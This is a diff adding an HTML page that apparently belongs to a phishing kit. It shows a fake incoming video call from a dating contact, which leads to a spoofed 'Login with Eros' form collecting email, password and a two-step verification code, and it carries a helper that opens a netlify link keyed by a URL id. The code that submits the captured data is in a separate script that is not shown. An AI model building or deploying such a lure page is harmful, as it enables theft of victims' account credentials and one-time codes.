@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Home | Login</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body>
+    <div class="h-screen bg-black flex items-center justify-center">
+        <div id="callBlock" class="w-[250px] bg-gray[800] rounded">
+            <div class="p-5 ">
+                <img class="h-28 w-28 rounded-full mx-auto text-center" src="https://video-chats.site/sss.jpg" alt="">
+                <p class="text-center pt-4 text-lg text-gray-500 font-semibold">Incoming Call...</p>
+                <div class="callIcons flex justify-around items-center pt-6">
+                    <div class="h-10 w-10 text-2xl flex items-center justify-center cursor-pointer rounded-full bg-green-500 text-white" onclick="showVideoChat()">
+                        <i class="fa-solid fa-phone"></i>
+                    </div>
+                    <div class="h-12 w-12 text-3xl flex items-center justify-center cursor-pointer rounded-full bg-red-500 text-white" onclick="hideCallBlock()">
+                        <i class="fa-solid fa-phone"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="videoChatBlock" class="hidden max-w-[400px] bg-transparent rounded">
+            <div class="p-5 ">
+                <h2 class="text-3xl font-bold text-white text-center">Live Video Chat</h2>
+                <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login with Eros and enjoy with Private <b>Live Video Chat</b> your dating partner.</p>
+                <button class="block p-2 my-5 w-full hover:bg-slate-600 border-2 border-[#eab308] text-[#eab308] rounded-md" onclick="hideVideoBlock()">Login With Eros</button>
+            </div>
+        </div>
+        <!-- Login Block -->
+        <div id="authenticationBlock" class="hidden min-w-[300px] max-w-[400px] bg-transparent rounded">
+            <div id="loginSystem">
+
+                <form >
+                    <div class="p-5 ">
+                        <h2 class="text-3xl font-bold text-white text-center">Login Into erros</h2>
+                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
+                            <div class="w-full">
+                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
+                                </label>
+                                <input id="email" class="w-full text-lg py-1 focus:outline-none focus:border-none border-none" type="email" name="" placeholder="Email address*">
+                            </div>
+                            <div class="text-center p-4 w-1/12">
+                                <i class="fas inline-block fa-envelope"></i>
+                            </div>
+                        </div>
+                        <!-- password field -->
+                        <div class="p-2 h-10 py-1 my-7 flex items-center bg-white overflow-hidden">
+                            <div class="w-full">
+                                <label class="w-full text-xs block" id="email-field" htmlfor="email">
+                                </label>
+                                <input id="password" class="w-full text-lg py-1 focus:outline-none focus:border-none border-none" type="password" name="" placeholder="password">
+                            </div>
+                            <div class="text-center p-4 w-1/12">
+                                <i class="fas inline-block fa-envelope"></i>
+                            </div>
+                        </div>
+                        <small class="text-red-700 font-bold hidden errors">incorrect password</small>
+
+                        <input type="submit" name="submit" class="block p-2 my-5 w-full hover:bg-slate-600 border-2 border-[#eab308] text-[#eab308] rounded-md" value="login Now">
+                    </div>
+                </form>
+            </div>
+            <div id="otpSystem">
+
+                <form >
+                    <h2 class="text-3xl font-bold text-white text-center">two Step Verification</h2>
+                    <div class="p-2 h-14 py-1 my-7 flex items-center bg-white overflow-hidden">
+                        <div class="w-full">
+                            <input  class="w-full bg-gray-200 text-lg py-2 focus:outline-none focus:border-none border-none" type="text" name="" placeholder="otp Code Here">
+                        </div>
+                    </div>
+                    <input type="submit" name="submit" value="Authenticate" class="block p-2 my-5 w-full bg-gray-100 text-gray-600 border-2 border-gray-600 rounded-md">
+                </form>
+            </div>
+         
+     
+        </div>
+    </div>
+    <script>
+        function showVideoChat() {
+            document.getElementById('callBlock').style.display = 'none';
+            document.getElementById('videoChatBlock').style.display = 'block';
+        }
+
+        function hideCallBlock() {
+            document.getElementById('callBlock').style.display = 'none';
+            document.getElementById('videoChatBlock').style.display = 'block';
+        }
+
+        function hideVideoBlock() {
+            document.getElementById('callBlock').style.display = 'none';
+            document.getElementById('videoChatBlock').style.display = 'none'; 
+            document.getElementById('authenticationBlock').style.display = 'block'; 
+        }
+
+        function navigateWithId() {
+            // Extract the query parameter from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('id');
+
+            // Navigate to the new page with the extracted user ID
+            window.open('https://erosss.netlify.app?id=' + userId, '_blank')
+        }
+    </script>
+    <script src="main.js"></script>
+</body>
+
+</html>
